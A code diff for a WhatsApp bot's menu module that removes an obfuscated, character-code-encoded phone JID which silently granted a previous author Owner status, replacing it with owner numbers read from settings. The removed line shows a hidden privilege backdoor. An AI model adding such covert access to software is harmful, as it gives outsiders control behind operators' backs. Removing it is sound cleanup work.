@@ -17,7 +17,12 @@ const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^β
 // every release (it read 2.3.2 while the bot was already running 2.3.3).
 const STYLISH_DIGITS = ['𝟢','𝟣','𝟤','𝟥','𝟦','𝟧','𝟨','𝟩','𝟪','𝟫'];
 const versionLabel = () => String(global.versi || '').replace(/\d/g, d => STYLISH_DIGITS[Number(d)]);
-const buffer64base = String.fromCharCode(54, 50, 56, 53, 49, 55, 57, 56, 51, 54, 54, 48, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116);
+// Owner-level numbers live in settings.js. This constant used to hold the previous
+// author's number, obfuscated, so his account was labelled Owner in every menu.
+const developerJids = [global.owner, ...(Array.isArray(global.developer) ? global.developer : [])]
+  .map(value => String(value || '').replace(/[^0-9]/g, ''))
+  .filter(Boolean)
+  .map(value => `${value}@s.whatsapp.net`);
 let menuImagePromise;
 const getMenuImage = () => {
   if (!menuImagePromise) {
@@ -84,7 +89,7 @@ const getPrefix = m => {
 };
 const getMenuContext = async (client, m) => {
   const botNumber = await client.decodeJid(client.user.id);
-  const isOwner = [botNumber, global.owner + '@s.whatsapp.net', buffer64base, ...owners].includes(m.sender) || Boolean(m.isDeveloper);
+  const isOwner = [botNumber, global.owner + '@s.whatsapp.net', ...developerJids, ...owners].includes(m.sender) || Boolean(m.isDeveloper);
   const statusUser = isOwner ? "👑 Owner" : premium.includes(m.sender) ? "💎 Premium" : "🫪 User Free";
   const modeBot = client.public ? "🌐 Public" : "🔒 Self";
   return {
@@ -675,6 +680,7 @@ async function ownermenu(client, m, smsg, store, args) {
 │ ├─ ${prefix}getcase
 │ ├─ ${prefix}done
 │ ├─ ${prefix}proses
+│ ├─ ${prefix}pairs
 │ └────────`;
   const buttonMsg = generateWAMessageFromContent(m.chat, {
     buttonsMessage: {
